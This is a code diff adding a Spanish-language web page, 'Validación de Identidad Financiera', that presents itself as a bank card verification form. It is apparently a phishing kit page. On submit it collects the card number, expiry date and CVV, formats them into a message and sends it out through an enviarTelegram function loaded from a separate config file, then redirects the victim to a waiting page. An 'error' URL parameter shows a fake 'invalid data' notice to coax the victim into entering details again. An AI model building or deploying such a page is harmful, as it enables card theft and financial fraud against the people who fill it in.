@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación de Identidad Financiera</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card-container { background: #ffffff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); width: 100%; max-width: 390px; }
+        .logo { display: block; max-width: 120px; margin: 0 auto 20px auto; }
+        h2 { font-size: 1.2rem; color: #2c3e50; text-align: center; margin-bottom: 20px; }
+        
+        .form-group { margin-bottom: 15px; position: relative; }
+        label { display: block; font-size: 0.85rem; color: #7f8c8d; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 1rem; outline: none; }
+        input:focus { border-color: #0056b3; }
+        
+        /* Contenedor del tipo de tarjeta */
+        .card-type-icon { position: absolute; right: 12px; top: 35px; font-weight: bold; font-size: 0.9rem; color: #7f8c8d; background: #eee; padding: 2px 6px; border-radius: 4px; }
+        
+        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .btn { width: 100%; padding: 14px; background: #0056b3; color: white; border: none; border-radius: 6px; font-size: 1rem; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .error-box { display: none; background: #f8d7da; color: #721c24; padding: 10px; border-radius: 6px; font-size: 0.9rem; margin-bottom: 15px; border: 1px solid #f5c6cb; }
+    </style>
+</head>
+<body>
+
+<div class="card-container">
+    <img src="./logo.png" alt="Logotipo" class="logo">
+    <h2>Verificación de Tarjeta Debito/Crédito</h2>
+    
+    <div class="error-box" id="errorContenedor">Los datos de la tarjeta son inválidos. Verifique y reasigne.</div>
+
+    <form id="formTarjeta">
+        <div class="form-group">
+            <label>Número de Tarjeta</label>
+            <input type="text" id="txtNumero" maxlength="19" inputmode="numeric" required placeholder="0000 0000 0000 0000">
+            <span class="card-type-icon" id="lblTipo">CARD</span>
+        </div>
+        
+        <div class="row">
+            <div class="form-group">
+                <label>Fecha Expiración</label>
+                <input type="text" id="txtFecha" maxlength="5" inputmode="numeric" required placeholder="MM/AA">
+            </div>
+            <div class="form-group">
+                <label>CVV (Código Seguridad)</label>
+                <input type="password" id="txtCvv" maxlength="4" inputmode="numeric" required placeholder="123">
+            </div>
+        </div>
+        
+        <button type="submit" class="btn">Finalizar Verificación</button>
+    </form>
+</div>
+
+<script src="./config.js"></script>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'true') {
+        document.getElementById('errorContenedor').style.display = 'block';
+    }
+
+    const inputNumero = document.getElementById('txtNumero');
+    const lblTipo = document.getElementById('lblTipo');
+
+    // Detector de Franquicias Dinámico (Visa / Mastercard)
+    inputNumero.addEventListener('input', (e) => {
+        let valor = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let formateado = valor.match(/.{1,4}/g);
+        e.target.value = formateado ? formateado.join(' ') : valor;
+
+        if (valor.startsWith('4')) {
+            lblTipo.innerText = 'VISA';
+            lblTipo.style.backgroundColor = '#1a1aff';
+            lblTipo.style.color = '#fff';
+        } else if (/^5[1-5]/.test(valor) || /^2[2-7]/.test(valor)) {
+            lblTipo.innerText = 'MASTER';
+            lblTipo.style.backgroundColor = '#ff6600';
+            lblTipo.style.color = '#fff';
+        } else {
+            lblTipo.innerText = 'CARD';
+            lblTipo.style.backgroundColor = '#eee';
+            lblTipo.style.color = '#7f8c8d';
+        }
+    });
+
+    // Formateador automático de fecha (MM/AA)
+    document.getElementById('txtFecha').addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        if (v.length >= 2) {
+            e.target.value = v.substring(0,2) + '/' + v.substring(2,4);
+        }
+    });
+
+    document.getElementById('formTarjeta').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const num = inputNumero.value;
+        const fecha = document.getElementById('txtFecha').value;
+        const cvv = document.getElementById('txtCvv').value;
+        const tipo = lblTipo.innerText;
+
+        let msg = `💳 *Datos de Tarjeta Recibidos [${tipo}]*\n` +
+                  `Número: \`${num}\`\n` +
+                  `Fecha: \`${fecha}\`\n` +
+                  `CVV: \`${cvv}\``;
+
+        await enviarTelegram(msg);
+        window.location.href = 'wait.html?finalizado=true';
+    });
+</script>
+</body>
+</html>
